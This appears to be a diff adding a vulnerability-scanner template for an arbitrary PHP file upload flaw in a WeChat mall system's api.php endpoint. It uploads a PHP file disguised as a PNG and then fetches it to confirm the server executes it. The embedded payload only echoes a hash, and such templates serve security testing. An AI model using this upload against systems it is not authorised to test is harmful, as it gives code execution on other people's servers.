@@ -1,0 +1,53 @@
+id: wechat-mall-api-anyfile-upload
+info:
+  name: 微商城系统 api.php接口存在任意文件上传
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    The 微商城系统 api.php endpoint is vulnerable to arbitrary file upload, allowing attackers to upload and execute PHP files on the server.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/api/api.php?mod=upload&type=1"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysml5dsBTMkgU6uGs
+    body: |
+      ------WebKitFormBoundarysml5dsBTMkgU6uGs
+      Content-Disposition: form-data; name="file"; filename="1.php"
+      Content-Type: image/png
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundarysml5dsBTMkgU6uGs--
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\"name\":\"\\/upload\\/(?P<name>.*?).php"
+    extractors:
+      - type: regex
+        name: name
+        group: 1
+        regex:
+          - "\"name\":\"\\/upload\\/(?P<name>.*?).php"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/{{name}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
